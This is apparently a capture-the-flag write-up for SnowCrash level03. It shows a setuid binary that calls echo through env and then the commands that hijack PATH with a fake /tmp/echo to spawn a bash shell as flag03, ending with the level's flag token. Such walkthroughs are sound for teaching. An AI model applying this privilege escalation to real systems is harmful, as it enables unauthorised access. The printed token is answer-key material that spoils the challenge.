# Level03

We have an executable located in the home directory

	level03@SnowCrash:~$ ls -l
	total 12
	-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
	
	level03@SnowCrash:~$ file level03
	level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped

This is a setuid binary executed as "flag03".
Here is the source code :

	int main(int argc,char **argv,char **envp)
	
	{
	  __gid_t __rgid;
	  __uid_t __ruid;
	  int iVar1;
	  gid_t gid;
	  uid_t uid;
	  
	  __rgid = getegid();
	  __ruid = geteuid();
	  setresgid(__rgid,__rgid,__rgid);
	  setresuid(__ruid,__ruid,__ruid);
	  iVar1 = system("/usr/bin/env echo Exploit me");
	  return iVar1;
	}

We can see that the call to echo isn't done with the full path and instead relies on the $PATH environment variable. We can exploit this by creating our own echo binary and make it run a shell.
Since this binary is run as flag03, the shell will belong to flag03 and we will be able to run getflag.

	level03@SnowCrash:~$ echo "/bin/bash" > /tmp/echo; chmod +x /tmp/echo
	
	level03@SnowCrash:~$ export PATH=/tmp:$PATH
	
	level03@SnowCrash:~$ which echo
	/tmp/echo
	
	level03@SnowCrash:~$ ./level03 
	bash: /home/user/level03/.bashrc: Permission denied
	
	flag03@SnowCrash:~$ id
	uid=3003(flag03) gid=2003(level03) groups=3003(flag03),100(users),2003(level03)
	
	flag03@SnowCrash:~$ getflag
	Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
